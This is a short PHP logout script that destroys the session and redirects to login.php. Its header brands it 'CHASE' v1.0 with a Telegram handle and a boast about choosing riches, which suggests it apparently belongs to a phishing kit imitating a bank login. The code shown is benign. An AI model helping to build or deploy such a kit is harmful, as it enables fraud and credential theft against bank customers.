<?php 
#################### *-* Start Include *-* ####################
/**
 * CHASE -
 * version 1.0
 * telegram = @Corleonex


   _____           _                            
  / ____|         | |                           
 | |     ___  _ __| | ___  ___  _ __   _____  __
 | |    / _ \| '__| |/ _ \/ _ \| '_ \ / _ \ \/ /
 | |___| (_) | |  | |  __/ (_) | | | |  __/>  < 
  \_____\___/|_|  |_|\___|\___/|_| |_|\___/_/\_\
                                                
                                                
" There's no nobility in poverty.
  I've been a poor man,
  and I've been a rich man.
   And I choose rich every fucking time. "

**/

session_start();
session_destroy();
header("location:login.php");  
exit;
?>